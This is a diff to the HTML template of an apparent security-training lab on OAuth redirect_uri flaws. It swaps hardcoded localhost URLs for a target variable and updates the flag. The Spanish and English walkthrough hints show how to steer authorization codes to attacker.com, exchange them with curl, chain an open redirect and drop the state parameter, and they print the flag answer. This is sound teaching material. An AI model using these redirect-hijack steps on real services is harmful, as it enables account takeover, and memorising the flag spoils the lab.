@@ -16,12 +16,12 @@
 
     <div class="rounded-lg px-3 py-2.5 mb-3 overflow-x-auto"
          style="background:rgba(0,0,0,.35);border:1px solid rgba(255,255,255,.08)">
-      <code class="text-xs font-mono break-all" style="color:var(--hl-primary)">/oauth/authorize?client_id=hacklabs-app&amp;redirect_uri=http://localhost:5000/oauth/callback&amp;state=abc123&amp;scope=read</code>
+      <code class="text-xs font-mono break-all" style="color:var(--hl-primary)">/oauth/authorize?client_id=hacklabs-app&amp;redirect_uri={{ target_base }}/oauth/callback&amp;state=abc123&amp;scope=read</code>
     </div>
 
     <form method="GET" action="/oauth/authorize" class="inline">
       <input type="hidden" name="client_id" value="hacklabs-app">
-      <input type="hidden" name="redirect_uri" value="http://localhost:5000/oauth/callback">
+      <input type="hidden" name="redirect_uri" value="{{ target_base }}/oauth/callback">
       <input type="hidden" name="state" value="abc123">
       <input type="hidden" name="scope" value="read">
       <button type="submit" class="btn-primary" data-i18n="oauth_start_btn">Start OAuth Flow</button>
@@ -33,7 +33,7 @@
     <h2 class="font-semibold text-sm mb-3" data-i18n="oauth_token">Access Token</h2>
     <div class="rounded-lg px-3 py-2.5 mb-3 overflow-x-auto"
          style="background:rgba(0,0,0,.35);border:1px solid rgba(255,255,255,.08)">
-      <code class="text-xs font-mono break-all" style="color:var(--hl-primary)">{{ token_data.access_token }}</code>
+      <code class="text-xs font-mono break-all" style="color:var(--hl-primary)">{{ token }}</code>
     </div>
     {% if token_data.flag %}
     <div class="alert-success text-sm font-mono">{{ token_data.flag }}</div>
@@ -41,7 +41,7 @@
     <div class="mt-3 text-xs text-gray-400" data-i18n="oauth_userinfo_hint">
       Use this token to access protected resources:
       <pre class="mt-1 rounded px-2 py-1.5 text-xs font-mono overflow-x-auto"
-           style="background:rgba(0,0,0,.35);border:1px solid rgba(255,255,255,.08)">curl http://localhost:5000/oauth/userinfo -H "Authorization: Bearer {{ token_data.access_token }}"</pre>
+         style="background:rgba(0,0,0,.35);border:1px solid rgba(255,255,255,.08)">curl {{ target_base }}/oauth/userinfo -H "Authorization: Bearer {{ token }}"</pre>
     </div>
   </div>
   {% endif %}
@@ -67,29 +67,29 @@
     <p>El servidor de autorización acepta cualquier redirect_uri sin validación. El código de autorización se envía donde el atacante indique.</p>
     <ol>
       <li>Intercepta la petición de autorización con Burp Suite y cambia redirect_uri:
-        <pre>http://localhost:5000/oauth/authorize?client_id=hacklabs-app&amp;redirect_uri=http://attacker.com/steal&amp;state=abc123&amp;scope=read</pre>
+        <pre>{{ target_base }}/oauth/authorize?client_id=hacklabs-app&amp;redirect_uri=http://attacker.com/steal&amp;state=abc123&amp;scope=read</pre>
       </li>
       <li>El código llega a attacker.com. Intercámbialo por un token:
-        <pre>curl -X POST http://localhost:5000/oauth/token \
+        <pre>curl -X POST {{ target_base }}/oauth/token \
   -d "code=CODE&amp;client_id=hacklabs-app&amp;client_secret=app-secret-123&amp;redirect_uri=http://attacker.com/steal"</pre>
       </li>
       <li>Accede al recurso protegido con el token:
-        <pre>curl http://localhost:5000/oauth/userinfo -H "Authorization: Bearer TOKEN"</pre>
+        <pre>curl {{ target_base }}/oauth/userinfo -H "Authorization: Bearer TOKEN"</pre>
       </li>
-      <li>Flag: <code>HL{0auth_r3d1r3ct_0wn3d}</code></li>
+      <li>Flag dedicada: <code>HL{04u7h_r3d1r3c7_0wn3d}</code></li>
     </ol>
 
     <h3>Medium — Dominio validado, bypass por path</h3>
     <p>Solo se valida el dominio, no el path completo. Usa el mismo dominio con un path diferente.</p>
     <ol>
       <li>Cambia el path de redirect_uri manteniendo el dominio permitido:
-        <pre>http://localhost:5000/oauth/authorize?client_id=hacklabs-app&amp;redirect_uri=http://localhost:5000/evil-path&amp;state=abc123&amp;scope=read</pre>
+        <pre>{{ target_base }}/oauth/authorize?client_id=hacklabs-app&amp;redirect_uri={{ target_base }}/evil-path&amp;state=abc123&amp;scope=read</pre>
       </li>
       <li>O encadena con un open redirect en el dominio permitido:
-        <pre>redirect_uri=http://localhost:5000/open_redirect?url=http://attacker.com</pre>
+        <pre>redirect_uri={{ target_base }}/open_redirect?url=http://attacker.com</pre>
       </li>
       <li>El código llega al path controlado. Extráelo de los logs/headers y procede como en Easy.</li>
-      <li>Flag: <code>HL{0auth_r3d1r3ct_0wn3d}</code></li>
+      <li>Flag dedicada: <code>HL{04u7h_r3d1r3c7_0wn3d}</code></li>
     </ol>
 
     <h3>Hard — Whitelist exacta, bypass de state</h3>
@@ -97,20 +97,20 @@
     <ol>
       <li>La URI whitelisted apunta a /oauth/callback. Encadena si /open_redirect acepta cualquier url:
         <pre># Primero comprueba si existe un open redirect en el servidor:
-curl "http://localhost:5000/open_redirect?url=http://attacker.com"
+curl "{{ target_base }}/open_redirect?url=http://attacker.com"
 
 # Si existe, úsalo como destino intermedio:
 # /oauth/callback redirige → /open_redirect → attacker.com</pre>
       </li>
       <li>State CSRF bypass: algunos servidores omiten la validación de state si no se envía:
-        <pre>http://localhost:5000/oauth/authorize?client_id=hacklabs-app&amp;redirect_uri=http://localhost:5000/oauth/callback&amp;scope=read
+        <pre>{{ target_base }}/oauth/authorize?client_id=hacklabs-app&amp;redirect_uri={{ target_base }}/oauth/callback&amp;scope=read
 # Nota: sin el parámetro state</pre>
       </li>
       <li>Intercambia el código obtenido:
-        <pre>curl -X POST http://localhost:5000/oauth/token \
-  -d "code=CODE&amp;client_id=hacklabs-app&amp;client_secret=app-secret-123&amp;redirect_uri=http://localhost:5000/oauth/callback"</pre>
+        <pre>curl -X POST {{ target_base }}/oauth/token \
+      -d "code=CODE&amp;client_id=hacklabs-app&amp;client_secret=app-secret-123&amp;redirect_uri={{ target_base }}/oauth/callback"</pre>
       </li>
-      <li>Flag: <code>HL{0auth_r3d1r3ct_0wn3d}</code></li>
+      <li>Flag dedicada: <code>HL{04u7h_r3d1r3c7_0wn3d}</code></li>
     </ol>
 
     <h3>Herramientas</h3>
@@ -121,29 +121,29 @@ curl "http://localhost:5000/open_redirect?url=http://attacker.com"
     <p>The authorization server accepts any redirect_uri without validation. The authorization code is sent wherever the attacker specifies.</p>
     <ol>
       <li>Intercept the authorization request with Burp Suite and change redirect_uri:
-        <pre>http://localhost:5000/oauth/authorize?client_id=hacklabs-app&amp;redirect_uri=http://attacker.com/steal&amp;state=abc123&amp;scope=read</pre>
+        <pre>{{ target_base }}/oauth/authorize?client_id=hacklabs-app&amp;redirect_uri=http://attacker.com/steal&amp;state=abc123&amp;scope=read</pre>
       </li>
       <li>The code arrives at attacker.com. Exchange it for a token:
-        <pre>curl -X POST http://localhost:5000/oauth/token \
+        <pre>curl -X POST {{ target_base }}/oauth/token \
   -d "code=CODE&amp;client_id=hacklabs-app&amp;client_secret=app-secret-123&amp;redirect_uri=http://attacker.com/steal"</pre>
       </li>
       <li>Access the protected resource with the token:
-        <pre>curl http://localhost:5000/oauth/userinfo -H "Authorization: Bearer TOKEN"</pre>
+        <pre>curl {{ target_base }}/oauth/userinfo -H "Authorization: Bearer TOKEN"</pre>
       </li>
-      <li>Flag: <code>HL{0auth_r3d1r3ct_0wn3d}</code></li>
+      <li>Dedicated flag: <code>HL{04u7h_r3d1r3c7_0wn3d}</code></li>
     </ol>
 
     <h3>Medium — Domain validated, path bypass</h3>
     <p>Only the domain is checked, not the full path. Use the same domain with a different path.</p>
     <ol>
       <li>Change the path of redirect_uri while keeping the allowed domain:
-        <pre>http://localhost:5000/oauth/authorize?client_id=hacklabs-app&amp;redirect_uri=http://localhost:5000/evil-path&amp;state=abc123&amp;scope=read</pre>
+        <pre>{{ target_base }}/oauth/authorize?client_id=hacklabs-app&amp;redirect_uri={{ target_base }}/evil-path&amp;state=abc123&amp;scope=read</pre>
       </li>
       <li>Or chain with an open redirect on the allowed domain:
-        <pre>redirect_uri=http://localhost:5000/open_redirect?url=http://attacker.com</pre>
+        <pre>redirect_uri={{ target_base }}/open_redirect?url=http://attacker.com</pre>
       </li>
       <li>The code arrives at the controlled path. Extract it from logs/headers and proceed as in Easy.</li>
-      <li>Flag: <code>HL{0auth_r3d1r3ct_0wn3d}</code></li>
+      <li>Dedicated flag: <code>HL{04u7h_r3d1r3c7_0wn3d}</code></li>
     </ol>
 
     <h3>Hard — Exact whitelist, state bypass</h3>
@@ -151,20 +151,20 @@ curl "http://localhost:5000/open_redirect?url=http://attacker.com"
       <ol>
       <li>The whitelisted URI points to /oauth/callback. Chain if /open_redirect accepts any url:
         <pre># First check if an open redirect exists on the server:
-curl "http://localhost:5000/open_redirect?url=http://attacker.com"
+curl "{{ target_base }}/open_redirect?url=http://attacker.com"
 
 # If it exists, use it as an intermediate step:
 # /oauth/callback redirects → /open_redirect → attacker.com</pre>
       </li>
       <li>State CSRF bypass: some servers skip state validation if the parameter is absent:
-        <pre>http://localhost:5000/oauth/authorize?client_id=hacklabs-app&amp;redirect_uri=http://localhost:5000/oauth/callback&amp;scope=read
+        <pre>{{ target_base }}/oauth/authorize?client_id=hacklabs-app&amp;redirect_uri={{ target_base }}/oauth/callback&amp;scope=read
 # Note: no state parameter</pre>
       </li>
       <li>Exchange the obtained code:
-        <pre>curl -X POST http://localhost:5000/oauth/token \
-  -d "code=CODE&amp;client_id=hacklabs-app&amp;client_secret=app-secret-123&amp;redirect_uri=http://localhost:5000/oauth/callback"</pre>
+        <pre>curl -X POST {{ target_base }}/oauth/token \
+      -d "code=CODE&amp;client_id=hacklabs-app&amp;client_secret=app-secret-123&amp;redirect_uri={{ target_base }}/oauth/callback"</pre>
       </li>
-      <li>Flag: <code>HL{0auth_r3d1r3ct_0wn3d}</code></li>
+      <li>Dedicated flag: <code>HL{04u7h_r3d1r3c7_0wn3d}</code></li>
     </ol>
 
     <h3>Tools</h3>
